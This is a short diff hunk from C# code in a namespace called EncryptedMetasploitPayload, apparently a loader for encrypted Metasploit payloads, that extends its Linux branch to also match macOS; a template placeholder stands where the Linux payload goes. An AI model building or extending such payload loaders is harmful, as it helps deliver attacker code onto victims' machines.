@@ -54,7 +54,7 @@ namespace EncryptedMetasploitPayload
 							}
 						}
 					}
-				} else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128) { //linux
+				} else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128 || os.Platform == PlatformID.MacOSX) { //linux
 
 					if (!x86)
 						{{lin64}}
